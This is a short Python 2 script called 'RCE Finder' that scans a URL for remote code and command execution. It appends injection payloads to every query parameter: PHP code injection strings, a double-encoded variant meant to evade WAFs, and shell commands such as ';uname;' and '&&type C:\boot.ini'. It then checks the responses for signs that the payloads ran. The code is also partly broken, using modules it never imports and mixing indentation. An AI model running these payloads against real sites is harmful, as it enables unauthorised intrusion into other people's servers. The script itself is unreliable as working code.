#!/usr/bin/env python
# RCE Finder
# By Rudra Sarkar - twitter.com/rudr4_sarkar
import urllib
import re
from httpheader import *


def main_function(url, payloads, check):
        #This function is going to split the url and try the append paylods in every parameter value.
        opener = urllib.urlopen(url)
	vuln = 0
        if opener.code == 999:
                # Detetcing the WebKnight WAF from the StatusCode.
                print ga.red +" [~] WebKnight WAF Detected!"+ga.end
                print ga.red +" [~] Delaying 3 seconds between every request"+ga.end
                time.sleep(3)
        for params in url.split("?")[1].split("&"):
            #sp = params.split("=")[0]
            for payload in payloads:
                #bugs = url.replace(sp, str(payload).strip())
                bugs = url.replace(params, params + str(payload).strip())
		#print bugs
		#exit()
                request = useragent.open(bugs)
		html = request.readlines()
                for line in html:
                    checker = re.findall(check, line)
                    if len(checker) !=0:
                        print "\n"
                        print ga.green+" [+] Vulnerablity Found . . ."+ga.end
                        print ga.green+" [+] Payload: " ,payload +ga.end
                        print ga.green+" [+] POC: "+ga.end + bugs
                        vuln +=1
        if vuln == 0:                
        	print ga.red+" [!] Target is not vulnerable!"+ga.end
        else:
        	print ga.yellow+"\n [+] Total %i RCE Found " % (vuln) +ga.end

# Here stands the vulnerabilities functions and detection payloads. 
def rce_func(url):
  	print ga.bold+"\n [!] Finding for Remote Code/Command Execution "+ga.end
  	print ga.yellow+" [!] Covering Operating Systems "+ga.end
  	print ga.yellow+" [!] Please wait ...."+ga.end
  	# Remote Code Injection Payloads
  	payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
  	# Below is the Encrypted Payloads to bypass some Security Filters & WAF's
  	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
  	# Remote Command Execution Payloads
  	payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
  	# used re.I to fix the case sensitve issues like "payload" and "PAYLOAD".
  	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
  	main_function(url, payloads, check)